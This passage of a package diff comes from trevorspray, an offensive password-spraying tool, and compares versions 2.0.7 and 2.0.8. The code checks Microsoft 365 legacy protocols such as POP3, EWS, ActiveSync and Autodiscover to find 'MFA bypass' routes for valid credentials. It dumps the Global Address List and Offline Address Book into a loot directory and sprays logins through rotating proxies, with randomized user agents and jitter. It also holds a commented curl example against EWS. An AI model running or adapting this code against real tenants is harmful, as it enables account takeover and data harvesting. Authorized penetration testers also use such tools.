+            session = poplib.POP3_SSL("outlook.office365.com")
             log.debug(session.getwelcome())
             session.user(username)
             session.pass_(password)
-            log.success(f'MFA bypass (POP3) enabled for {username}!')
+            log.success(f"MFA bypass (POP3) enabled for {username}!")
             success = True
 
         except poplib.error_proto as e:
-            log.warning(f'POP3 MFA bypass failed for {username}: {e}')
+            log.warning(f"POP3 MFA bypass failed for {username}: {e}")
 
         except Exception as e:
             if log.level <= logging.DEBUG:
                 import traceback
+
                 log.error(traceback.format_exc())
             else:
-                log.error(f'Unknown error while testing POP3 for {username}: {e}')
+                log.error(f"Unknown error while testing POP3 for {username}: {e}")
 
         return success
 
-
     def test_ews(self, username, password):
-
-        url = 'https://outlook.office365.com/EWS/Exchange.asmx'
-        log.info(f'Testing Exchange Web Services (EWS) MFA bypass for {username} ({url})')
+        url = "https://outlook.office365.com/EWS/Exchange.asmx"
+        log.info(
+            f"Testing Exchange Web Services (EWS) MFA bypass for {username} ({url})"
+        )
         import csv
         import poplib
         import string
         import datetime
         import exchangelib
         from exchangelib.errors import ErrorNameResolutionNoResults
+
         success = False
         contacts_retrieved = 0
 
         # curl -v -H 'Content-Type: text/xml' https://outlook.office365.com/EWS/Exchange.asmx --user "BOB@EVILCORP.COM:Password123" --data-binary $'<?xml version=\'1.0\' encoding=\'utf-8\'?>\x0a<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"><s:Header><t:RequestServerVersion Version=\"Exchange2019\"/></s:Header><s:Body><m:ResolveNames ReturnFullContactData=\"false\"><m:UnresolvedEntry>BOB@EVILCORP.COM</m:UnresolvedEntry></m:ResolveNames></s:Body></s:Envelope>'
         try:
             credentials = exchangelib.Credentials(username, password)
-            config = exchangelib.Configuration(service_endpoint=url, credentials=credentials)
-            account = exchangelib.Account(primary_smtp_address=username, config=config, autodiscover=False, access_type=exchangelib.DELEGATE)
-            log.success(f'MFA bypass (EWS) enabled for {username}!')
+            config = exchangelib.Configuration(
+                service_endpoint=url, credentials=credentials
+            )
+            account = exchangelib.Account(
+                primary_smtp_address=username,
+                config=config,
+                autodiscover=False,
+                access_type=exchangelib.DELEGATE,
+            )
+            log.success(f"MFA bypass (EWS) enabled for {username}!")
             success = True
 
             try:
                 found = set()
-                domain = username.split('@')[-1]
-                filename = self.loot_dir / (datetime.datetime.now().strftime('%Y%m%d_%H%M%S') + f'_{domain}_gal.csv')
-                log.success(f'Attempting to dump Global Address List')
-                with open(str(filename), 'a', newline='') as f:
-                    c = csv.DictWriter(f, fieldnames=['Name', 'Email'])
+                domain = username.split("@")[-1]
+                filename = self.loot_dir / (
+                    datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                    + f"_{domain}_gal.csv"
+                )
+                log.success(f"Attempting to dump Global Address List")
+                with open(str(filename), "a", newline="") as f:
+                    c = csv.DictWriter(f, fieldnames=["Name", "Email"])
                     c.writeheader()
                     for i in list(string.ascii_lowercase):
-
-                        results = account.protocol.resolve_names([i], return_full_contact_data=True)
+                        results = account.protocol.resolve_names(
+                            [i], return_full_contact_data=True
+                        )
                         for result in results:
                             if type(result) not in (ErrorNameResolutionNoResults,):
                                 mailbox, contact = result
-                                name = str(getattr(mailbox, 'name', ''))
-                                email = str(getattr(mailbox, 'email_address', ''))
+                                name = str(getattr(mailbox, "name", ""))
+                                email = str(getattr(mailbox, "email_address", ""))
                                 if not (name, email) in found:
                                     found.add((name, email))
-                                    log.success(f'Contact looted: {name} - {email}')
-                                    c.writerow({
-                                        'Name': name,
-                                        'Email': email
-                                    })
+                                    log.success(f"Contact looted: {name} - {email}")
+                                    c.writerow({"Name": name, "Email": email})
                                     contacts_retrieved += 1
 
             except exchangelib.errors.EWSError as e:
-                log.warning(f'Failed to retrieve GAL for {domain}: {e}')
+                log.warning(f"Failed to retrieve GAL for {domain}: {e}")
 
         except exchangelib.errors.EWSError as e:
-            log.warning(f'EWS test failed for {username}: {e}')
+            log.warning(f"EWS test failed for {username}: {e}")
 
         except Exception as e:
             if log.level <= logging.DEBUG:
                 import traceback
+
                 log.error(traceback.format_exc())
             else:
-                log.error(f'Unknown error while testing EWS for {username}: {e}')
+                log.error(f"Unknown error while testing EWS for {username}: {e}")
 
         finally:
             if contacts_retrieved > 0:
-                log.success(f'Successfully wrote {contacts_retrieved:,} emails to {filename}')
-
+                log.success(
+                    f"Successfully wrote {contacts_retrieved:,} emails to {filename}"
+                )
 
     def test_eas(self, username, password):
-
         success = False
-        url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'
-        log.info(f'Testing Exchange ActiveSync (EAS) MFA bypass for {username}')
+        url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
+        log.info(f"Testing Exchange ActiveSync (EAS) MFA bypass for {username}")
 
         response = None
         with suppress(Exception):
-            response = request(
-                'OPTIONS',
-                url,
-                auth=HTTPBasicAuth(username, password)
-            )
-            response_headers = dict(getattr(response, 'headers', {}))
+            response = request("OPTIONS", url, auth=HTTPBasicAuth(username, password))
+            response_headers = dict(getattr(response, "headers", {}))
 
-        if getattr(response, 'status_code', 0) == 200:
-            log.success(f'MFA bypass (Exchange ActiveSync) enabled for {username}! ({url})')
+        if getattr(response, "status_code", 0) == 200:
+            log.success(
+                f"MFA bypass (Exchange ActiveSync) enabled for {username}! ({url})"
+            )
             success = True
 
         if success and response_headers:
             log.success(highlight_json(response_headers))
 
         return success
 
-
     def test_exo_pwsh(self, username, password):
-
         success = False
-        url = 'https://outlook.office365.com/powershell-liveid/'
-        log.info(f'Testing Exchange Online Powershell (EXO) MFA bypass for {username}')
+        url = "https://outlook.office365.com/powershell-liveid/"
+        log.info(f"Testing Exchange Online Powershell (EXO) MFA bypass for {username}")
 
         response = None
         with suppress(Exception):
-            response = request(
-                'OPTIONS',
-                url,
-                auth=HTTPBasicAuth(username, password)
-            )
+            response = request("OPTIONS", url, auth=HTTPBasicAuth(username, password))
 
-        if getattr(response, 'status_code', 0) == 200:
-            log.success(f'MFA bypass (Exchange Online Powershell) enabled for {username} ({url})!')
+        if getattr(response, "status_code", 0) == 200:
+            log.success(
+                f"MFA bypass (Exchange Online Powershell) enabled for {username} ({url})!"
+            )
             success = True
 
         return success
 
-
     def test_autodiscover(self, username, password):
-
         success = False
-        url = 'https://outlook.office365.com/autodiscover/autodiscover.xml'
+        url = "https://outlook.office365.com/autodiscover/autodiscover.xml"
         auth = HTTPBasicAuth(username, password)
-        log.info(f'Testing Autodiscover MFA bypass for {username}')
+        log.info(f"Testing Autodiscover MFA bypass for {username}")
 
         response = None
         try:
             response = request(
-                'POST',
+                "POST",
                 url,
-                headers = {
-                    'Content-Type': 'text/xml'
-                },
+                headers={"Content-Type": "text/xml"},
                 auth=auth,
-                data=f'<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{username}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>'
+                data=f'<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{username}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>',
             )
 
-            if getattr(response, 'status_code', 0) == 200:
-                log.success(f'MFA bypass (Autodiscover) enabled for {username}! ({url})')
+            if getattr(response, "status_code", 0) == 200:
+                log.success(
+                    f"MFA bypass (Autodiscover) enabled for {username}! ({url})"
+                )
                 log.success(highlight_xml(response.content))
                 success = True
 
-            log.info(f'Testing Offline Address Book (OAB) MFA bypass for {username}')
+            log.info(f"Testing Offline Address Book (OAB) MFA bypass for {username}")
             try:
-                found = re.search(r'<OABUrl>(http.*)</OABUrl>', response.text)
+                found = re.search(r"<OABUrl>(http.*)</OABUrl>", response.text)
 
                 if found:
-                    log.success(f'Found OAB URL for {username}: {found.group(1)}')
+                    log.success(f"Found OAB URL for {username}: {found.group(1)}")
                     oab_url = found.group(1)
 
                     oab_response = request(
-                        url=f'{oab_url}/oab.xml',
-                        headers = {
-                            'Content-Type': 'text/xml'
-                        },
-                        auth=auth
+                        url=f"{oab_url}/oab.xml",
+                        headers={"Content-Type": "text/xml"},
+                        auth=auth,
                     )
                     lzx_found = False
                     for line in oab_response.text.splitlines():
-                        found = ''
-                        if not line.strip().lower().startswith('<template'):
-                            found = re.search(r'>(.+\.lzx)<', line)
+                        found = ""
+                        if not line.strip().lower().startswith("<template"):
+                            found = re.search(r">(.+\.lzx)<", line)
 
                         if found:
-                            lzx_url = f'{oab_url}{found.group(1)}'
-                            log.success(f'Found LZX for {username}: {lzx_url}')
-                            lzx_file = self.loot_dir / lzx_url.split('/')[-1]
-                            log.success(f'Downloading LZX for {username} to {lzx_file}')
+                            lzx_url = f"{oab_url}{found.group(1)}"
+                            log.success(f"Found LZX for {username}: {lzx_url}")
+                            lzx_file = self.loot_dir / lzx_url.split("/")[-1]
+                            log.success(f"Downloading LZX for {username} to {lzx_file}")
                             try:
-                                download_file(lzx_url, str(lzx_file), verify=False, auth=auth)
-                                log.success('Successfully downloaded LZX file. See README for instructions on how to extract data.')
+                                download_file(
+                                    lzx_url, str(lzx_file), verify=False, auth=auth
+                                )
+                                log.success(
+                                    "Successfully downloaded LZX file. See README for instructions on how to extract data."
+                                )
                                 lzx_found = True
                             except Exception as e:
-                                log.warning(f'Failed to retrieve LZX file at {lzx_url}')
+                                log.warning(f"Failed to retrieve LZX file at {lzx_url}")
                     if not lzx_found:
-                        log.warning(f'No LZX link found for {username}')
+                        log.warning(f"No LZX link found for {username}")
 
                 else:
-                    log.warn(f'No OAB URL found for {username}.')
+                    log.warn(f"No OAB URL found for {username}.")
 
             except Exception as e:
                 if log.level <= logging.DEBUG:
                     import traceback
+
                     log.error(traceback.format_exc())
                 else:
-                    log.error(f'Encountered error while checking for OAB (-v to debug): {e}')
+                    log.error(
+                        f"Encountered error while checking for OAB (-v to debug): {e}"
+                    )
 
         except Exception as e:
             if log.level <= logging.DEBUG:
                 import traceback
+
                 log.error(traceback.format_exc())
             else:
-                log.error(f'Encountered error while checking Autodiscover (-v to debug): {e}')
+                log.error(
+                    f"Encountered error while checking Autodiscover (-v to debug): {e}"
+                )
 
         return success
 
-
     def test_azure_management(self, username, password):
-
         from ..sprayers.msol import MSOL
 
         success = False
-        log.info(f'Testing Azure management for {username}')
+        log.info(f"Testing Azure management for {username}")
 
         request_data = {
-            'username': username,
-            'password': password,
-            'resource': 'https://management.core.windows.net',
-            'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b',
-            'client_info': '1',
-            'grant_type': 'password',
-            'scope': 'openid',
+            "username": username,
+            "password": password,
+            "resource": "https://management.core.windows.net",
+            "client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
+            "client_info": "1",
+            "grant_type": "password",
+            "scope": "openid",
         }
 
         headers = {
-            'Accept': 'application/json',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Windows-AzureAD-Authentication-Provider/1.0',
+            "Accept": "application/json",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Windows-AzureAD-Authentication-Provider/1.0",
         }
 
         try:
             response = request(
-                'POST',
-                'https://login.microsoftonline.com/common/oauth2/token',
+                "POST",
+                "https://login.microsoftonline.com/common/oauth2/token",
                 headers=headers,
-                data=request_data
+                data=request_data,
             )
 
             valid, exists, locked, msg = MSOL.check_response(None, response)
             if valid:
-                log.success(f'{username} can authenticate to the Azure Service Management API - {msg}')
+                log.success(
+                    f"{username} can authenticate to the Azure Service Management API - {msg}"
+                )
             else:
-                log.warning(f'{username} cannot authenticate to the Azure Service Management API - {msg}')
-
-            if getattr(response, 'status_code', 0) == 200:
-                log.success(f'MFA Bypass! Azure management enabled for {username}! The "az" PowerShell module should work here.')
+                log.warning(
+                    f"{username} cannot authenticate to the Azure Service Management API - {msg}"
+                )
+
+            if getattr(response, "status_code", 0) == 200:
+                log.success(
+                    f'MFA Bypass! Azure management enabled for {username}! The "az" PowerShell module should work here.'
+                )
                 success = True
             else:
-                log.warn(f'Azure management not enabled for {username}.')
+                log.warn(f"Azure management not enabled for {username}.")
 
         except Exception as e:
             if log.level <= logging.DEBUG:
                 import traceback
+
                 log.error(traceback.format_exc())
             else:
-                log.error(f'Encountered error while checking Azure Management API (-v to debug): {e}')
-
+                log.error(
+                    f"Encountered error while checking Azure Management API (-v to debug): {e}"
+                )
 
         return success
 
-
     def test_um(self, username, password):
-
         success = False
-        url = 'https://outlook.office365.com/EWS/UM2007Legacy.asmx'
-        log.info(f'Testing Unified Messaging (UM) MFA bypass for {username}')
+        url = "https://outlook.office365.com/EWS/UM2007Legacy.asmx"
+        log.info(f"Testing Unified Messaging (UM) MFA bypass for {username}")
 
         response = None
         try:
             response = request(
-                'POST',
+                "POST",
                 url,
-                headers = {
-                    'Content-Type': 'text/xml; charset=utf-8'
-                },
+                headers={"Content-Type": "text/xml; charset=utf-8"},
                 auth=HTTPBasicAuth(username, password),
-                data='''<?xml version="1.0" encoding="utf-8"?>
+                data="""<?xml version="1.0" encoding="utf-8"?>
     <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
     <soap:Body>
     <GetUMProperties xmlns="https://schemas.microsoft.com/exchange/services/2006/messages" />
     </soap:Body>
-    </soap:Envelope>'''
+    </soap:Envelope>""",
             )
-            response_headers = dict(getattr(response, 'headers', {}))
+            response_headers = dict(getattr(response, "headers", {}))
 
-            if getattr(response, 'status_code', 0) != 401 and 'text/xml' in response.headers.get('Content-Type'):
-                log.success(f'MFA bypass (Unified Messaging) enabled for {username}! ({url})')
+            if getattr(
+                response, "status_code", 0
+            ) != 401 and "text/xml" in response.headers.get("Content-Type"):
+                log.success(
+                    f"MFA bypass (Unified Messaging) enabled for {username}! ({url})"
+                )
                 log.debug(highlight_xml(response.content))
                 success = True
 
         except Exception as e:
             if log.level <= logging.DEBUG:
                 import traceback
+
                 log.error(traceback.format_exc())
             else:
-                log.error(f'Encountered error while checking Unified Messaging (-v to debug): {e}')
+                log.error(
+                    f"Encountered error while checking Unified Messaging (-v to debug): {e}"
+                )
 
         return success
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/proxy.py` & `trevorspray-2.0.8/trevorspray/lib/proxy.py`

 * *Files 5% similar despite different names*

```diff
@@ -4,157 +4,150 @@
 import threading
 from time import sleep
 from contextlib import suppress
 from trevorproxy.lib.ssh import SSHProxy
 from .util import windows_user_agent, request
 from trevorproxy.lib.errors import SSHProxyError
 
-log = logging.getLogger('trevorspray.proxy')
+log = logging.getLogger("trevorspray.proxy")
 
 
 class SubnetThread(threading.Thread):
-
     def __init__(self, *args, **kwargs):
-
-        self.listen_address = '127.0.0.1'
-        self.trevor = kwargs.pop('trevor', None)
+        self.listen_address = "127.0.0.1"
+        self.trevor = kwargs.pop("trevor", None)
 
         super().__init__(*args, **kwargs)
 
     def run(self):
-
         from trevorproxy.lib.subnet import SubnetProxy
         from trevorproxy.lib.socks import ThreadingTCPServer, SocksProxy
 
         subnet_proxy = SubnetProxy(
-            interface=self.trevor.options.interface,
-            subnet=self.trevor.options.subnet
+            interface=self.trevor.options.interface, subnet=self.trevor.options.subnet
         )
         try:
             subnet_proxy.start()
             with ThreadingTCPServer(
-                    (self.listen_address, self.trevor.options.base_port),
-                    SocksProxy,
-                    proxy=subnet_proxy,
-                ) as server:
-                log.info(f'Listening on socks5://{self.listen_address}:{self.trevor.options.base_port}')
+                (self.listen_address, self.trevor.options.base_port),
+                SocksProxy,
+                proxy=subnet_proxy,
+            ) as server:
+                log.info(
+                    f"Listening on socks5://{self.listen_address}:{self.trevor.options.base_port}"
+                )
                 server.serve_forever()
         finally:
             subnet_proxy.stop()
 
 
 class ProxyThread(threading.Thread):
-
     def __init__(self, *args, **kwargs):
-
-        self.trevor = kwargs.pop('trevor', None)
-        host = kwargs.pop('host', None)
-        proxy_port = kwargs.pop('proxy_port', None)
+        self.trevor = kwargs.pop("trevor", None)
+        host = kwargs.pop("host", None)
+        proxy_port = kwargs.pop("proxy_port", None)
 
         self.proxy = None
         self.proxy_arg = None
 
-        if host == '<subnet>':
+        if host == "<subnet>":
             self.proxy = str(self.trevor.options.subnet)
             self.proxy_arg = {
-                'http': f'socks5://{self.trevor.subnet_proxy.listen_address}:{self.trevor.options.base_port}',
-                'https': f'socks5://{self.trevor.subnet_proxy.listen_address}:{self.trevor.options.base_port}',
+                "http": f"socks5://{self.trevor.subnet_proxy.listen_address}:{self.trevor.options.base_port}",
+                "https": f"socks5://{self.trevor.subnet_proxy.listen_address}:{self.trevor.options.base_port}",
             }
 
         elif host is not None:
             self.proxy = SSHProxy(
                 host=host,
                 key=self.trevor.options.key,
                 key_pass=self.trevor.options.key_pass,
                 proxy_port=proxy_port,
             )
             self.proxy.start()
-            self.proxy_arg = {
-                'http': str(self.proxy),
-                'https': str(self.proxy)
-            }
+            self.proxy_arg = {"http": str(self.proxy), "https": str(self.proxy)}
 
         super().__init__(*args, **kwargs)
         self._running = False
         self.lock = threading.Lock()
         self.q = None
 
         self.initial_delay = 0
 
-
     def stop(self):
-
         with suppress(Exception):
             self.proxy.stop()
 
-
     def submit(self, user, password, enumerate_users=False):
-
         with self.lock:
             if self.q is None:
                 self.q = (user, password, enumerate_users)
                 return True
         return False
 
-
     def run(self):
-
         while not self.trevor._stop:
-
             try:
-
                 if self.initial_delay:
-                    log.verbose(f'Initial delay for {self} - sleeping for {self.initial_delay:.1f} seconds')
+                    log.verbose(
+                        f"Initial delay for {self} - sleeping for {self.initial_delay:.1f} seconds"
+                    )
                     sleep(self.initial_delay)
                     self.initial_delay = 0
 
                 user, password, enumerate_users = None, None, None
                 with self.lock:
                     if self.q is not None:
                         user, password, enumerate_users = self.q
                         self.q = None
 
                 if enumerate_users:
                     sprayer = self.trevor.user_enumerator
                 else:
                     sprayer = self.trevor.sprayer
 
-                login_id = f'{self.trevor.sprayer.id}|{user}|{password}'
+                login_id = f"{self.trevor.sprayer.id}|{user}|{password}"
 
                 if not user:
-                    sleep(.1)
+                    sleep(0.1)
                     continue
 
                 self._running = True
 
-                password_str = (f':{password}' if password else '')
+                password_str = f":{password}" if password else ""
                 with self.trevor.lock:
                     self.trevor.sprayed_counter += 1
-                    if not self.trevor.options.force and not enumerate_users and login_id in self.trevor.tried_logins:
-                        log.info(f'Already tried {user}:{password}, skipping.')
+                    if (
+                        not self.trevor.options.force
+                        and not enumerate_users
+                        and login_id in self.trevor.tried_logins
+                    ):
+                        log.info(f"Already tried {user}:{password}, skipping.")
                         self._running = False
                         continue
 
-                valid, exists, locked, msg = self.check_cred(user, password, enumerate_users)
+                valid, exists, locked, msg = self.check_cred(
+                    user, password, enumerate_users
+                )
 
                 with self.trevor.lock:
                     self.trevor.tried_logins[login_id] = True
 
                     if valid:
                         exists = True
-                        log.success(f'{user}{password_str} - {msg}')
-                        self.trevor.valid_logins.append(f'{user}:{password}')
+                        log.success(f"{user}{password_str} - {msg}")
+                        self.trevor.valid_logins.append(f"{user}:{password}")
                         if self.trevor.options.exit_on_success:
                             self.trevor._stop = True
                     elif locked:
-                        log.error(f'{user}{password_str} - {msg}')
+                        log.error(f"{user}{password_str} - {msg}")
                     elif exists:
-                        log.warning(f'{user}{password_str} - {msg}')
+                        log.warning(f"{user}{password_str} - {msg}")
                     else:
-                        log.info(f'{user}{password_str} - {msg}')
+                        log.info(f"{user}{password_str} - {msg}")
 
                     if exists:
                         self.trevor.existent_users.append(user)
 
                     if locked:
                         self.trevor.lockout_counter += 1
 
@@ -163,160 +156,182 @@
                             sprayer.loot((user, password))
                         if self.trevor.options.exit_on_success:
                             self._running = False
                             self.q = None
                             return
 
                     # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
-                    if not self.trevor.options.ignore_lockouts and self.trevor.lockout_counter == 10 and self.trevor.lockout_question == False:
-                        log.error('Multiple Account Lockouts Detected!')
-                        log.error('10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?')
-                        yes = {'yes', 'y'}
-                        no = {'no', 'n', ''}
+                    if (
+                        not self.trevor.options.ignore_lockouts
+                        and self.trevor.lockout_counter == 10
+                        and self.trevor.lockout_question == False
+                    ):
+                        log.error("Multiple Account Lockouts Detected!")
+                        log.error(
+                            "10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
+                        )
+                        yes = {"yes", "y"}
+                        no = {"no", "n", ""}
                         self.trevor.lockout_question = True
-                        choice = 'X'
-                        while (choice not in no and choice not in yes):
-                            choice = input('\n[USER] [Y/N] (default is N): ').lower()
+                        choice = "X"
+                        while choice not in no and choice not in yes:
+                            choice = input("\n[USER] [Y/N] (default is N): ").lower()
 
                         if choice in no:
-                            log.info('Cancelling the password spray.')
-                            log.info('NOTE: If you are seeing multiple "account is locked" messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.')
+                            log.info("Cancelling the password spray.")
+                            log.info(
+                                'NOTE: If you are seeing multiple "account is locked" messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.'
+                            )
                             return self.cancel_spray()
 
-                verb = ('Enumerated' if enumerate_users else 'Sprayed')
-                print(f'       {verb} {self.trevor.sprayed_counter:,} / {self.trevor.sprayed_possible:,} accounts\r', end='', flush=True)
+                verb = "Enumerated" if enumerate_users else "Sprayed"
+                print(
+                    f"       {verb} {self.trevor.sprayed_counter:,} / {self.trevor.sprayed_possible:,} accounts\r",
+                    end="",
+                    flush=True,
+                )
 
                 if locked and self.trevor.options.lockout_delay:
-                    log.verbose(f'Lockout encountered, sleeping thread for {self.trevor.options.lockout_delay:.1f} seconds')
+                    log.verbose(
+                        f"Lockout encountered, sleeping thread for {self.trevor.options.lockout_delay:.1f} seconds"
+                    )
                     sleep(self.trevor.options.lockout_delay)
 
-                if (self.trevor.options.delay or self.trevor.options.jitter) and \
-                    ((exists != False) or locked or sprayer.fail_nonexistent) and \
-                    not (self.q is None and self.trevor.stopping):
+                if (
+                    (self.trevor.options.delay or self.trevor.options.jitter)
+                    and ((exists != False) or locked or sprayer.fail_nonexistent)
+                    and not (self.q is None and self.trevor.stopping)
+                ):
                     delay = float(self.trevor.options.delay)
                     jitter = random.random() * self.trevor.options.jitter
                     delay += jitter
                     if delay > 0:
                         if self.trevor.options.ssh:
-                            log.debug(f'Sleeping thread for {delay:.1f} seconds ({self.trevor.options.delay:.1f}s delay + {jitter:.1f}s jitter)')
+                            log.debug(
+                                f"Sleeping thread for {delay:.1f} seconds ({self.trevor.options.delay:.1f}s delay + {jitter:.1f}s jitter)"
+                            )
                             sleep(delay)
                         else:
-                            log.debug(f'Sleeping for {delay:.1f} seconds ({self.trevor.options.delay:.1f}s delay + {jitter:.1f}s jitter)')
+                            log.debug(
+                                f"Sleeping for {delay:.1f} seconds ({self.trevor.options.delay:.1f}s delay + {jitter:.1f}s jitter)"
+                            )
                             with self.trevor.lock:
                                 sleep(delay)
 
                 elif exists == False and not sprayer.fail_nonexistent:
-                    log.debug(f'Skipping delay since account doesn\'t exist ({self.trevor.sprayer.__class__.__name__}.fail_nonexistent = {self.trevor.sprayer.fail_nonexistent})')
+                    log.debug(
+                        f"Skipping delay since account doesn't exist ({self.trevor.sprayer.__class__.__name__}.fail_nonexistent = {self.trevor.sprayer.fail_nonexistent})"
+                    )
 
                 self._running = False
 
             except Exception as e:
-                log.error(f'Unhandled error in proxy thread: {e}')
+                log.error(f"Unhandled error in proxy thread: {e}")
                 if log.level <= logging.DEBUG:
                     import traceback
+
                     log.error(traceback.format_exc())
                 else:
-                    log.error(f'Encountered error (-v to debug): {e}')
+                    log.error(f"Encountered error (-v to debug): {e}")
                 self.cancel_spray()
                 break
 
-
     def cancel_spray(self):
-
         self.trevor._stop = True
         for proxy in self.trevor.proxies:
             with suppress(Exception):
                 proxy._running = False
                 proxy.q = None
 
-
     @property
     def running(self):
-
         return self._running or self.q is not None
 
-
     def check_cred(self, user, password, enumerate_users=False):
-        '''
+        """
         returns (valid, exists, locked, msg)
-        '''
+        """
 
         valid = False
         exists = None
         locked = None
-        msg = ''
+        msg = ""
 
         if enumerate_users:
             sprayer = self.trevor.user_enumerator
         else:
             sprayer = self.trevor.sprayer
 
         success = False
         while not success:
             session = requests.Session()
             try:
                 prepared_request = sprayer.create_request(user, password).prepare()
             except Exception as e:
-                log.error(f'Unhandled error in {sprayer.__class__.__name__}.create_request(): {e} (-v to debug)')
+                log.error(
+                    f"Unhandled error in {sprayer.__class__.__name__}.create_request(): {e} (-v to debug)"
+                )
                 if log.level <= logging.DEBUG:
                     import traceback
+
                     log.error(traceback.format_exc())
                 self.trevor._stop = True
                 self._running = False
                 break
 
             # randomize user-agent if requested
             if self.trevor.options.random_useragent:
-                current_useragent = prepared_request.headers.get('User-Agent', windows_user_agent)
-                prepared_request.headers['User-Agent'] = f'{current_useragent} {random.randint(0,99999)}.{random.randint(0,99999)}'
+                current_useragent = prepared_request.headers.get(
+                    "User-Agent", windows_user_agent
+                )
+                prepared_request.headers[
+                    "User-Agent"
+                ] = f"{current_useragent} {random.randint(0,99999)}.{random.randint(0,99999)}"
 
             kwargs = {
-                'timeout': self.trevor.options.timeout,
-                'allow_redirects': False,
-                'verify': False,
-                'retries': (0 if self.trevor.options.ssh else 'infinite')
+                "timeout": self.trevor.options.timeout,
+                "allow_redirects": False,
+                "verify": False,
+                "retries": (0 if self.trevor.options.ssh else "infinite"),
             }
             if self.trevor.options.proxy:
-                kwargs['proxies'] = {
-                    'http': self.trevor.options.proxy,
-                    'https': self.trevor.options.proxy
+                kwargs["proxies"] = {
+                    "http": self.trevor.options.proxy,
+                    "https": self.trevor.options.proxy,
                 }
             if self.proxy is not None:
-                kwargs['proxies'] = self.proxy_arg
-            log.debug(f'HTTP {prepared_request.method} through proxy: {self.proxy}')
-            response = request(
-                prepared_request,
-                session=session,
-                **kwargs
-            )
+                kwargs["proxies"] = self.proxy_arg
+            log.debug(f"HTTP {prepared_request.method} through proxy: {self.proxy}")
+            response = request(prepared_request, session=session, **kwargs)
             if isinstance(response, Exception):
-                log.error(f'Error in web request: {response}')
+                log.error(f"Error in web request: {response}")
                 # rebuild proxy
                 if self.proxy_arg and not type(self.proxy) == str:
-                    log.verbose(f'Rebuilding proxy {self}')
+                    log.verbose(f"Rebuilding proxy {self}")
                     try:
                         self.proxy.start()
                     except SSHProxyError as e:
                         log.error(e)
                 sleep(1)
                 continue
             try:
                 valid, exists, locked, msg = sprayer.check_response(response)
                 success = True
             except Exception as e:
-                log.error(f'Unhandled error in {sprayer.__class__.__name__}.check_response(): {e} (-v to debug)')
+                log.error(
+                    f"Unhandled error in {sprayer.__class__.__name__}.check_response(): {e} (-v to debug)"
+                )
                 if log.level <= logging.DEBUG:
                     import traceback
+
                     log.error(traceback.format_exc())
 
         result = (valid, exists, locked, msg)
         return result
 
-
     def __str__(self):
-
         if self.proxy:
             return str(self.proxy)
         elif self.trevor.options.ssh:
-            return 'proxy thread'
+            return "proxy thread"
         else:
-            return 'thread'
+            return "thread"
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/__init__.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/__init__.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/__init__.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/__init__.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/adfs.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/adfs.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/adfs.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/adfs.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/base.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/base.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/base.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/base.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/example.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/example.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/example.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/example.cpython-39.pyc`

 * *Files identical despite different names*

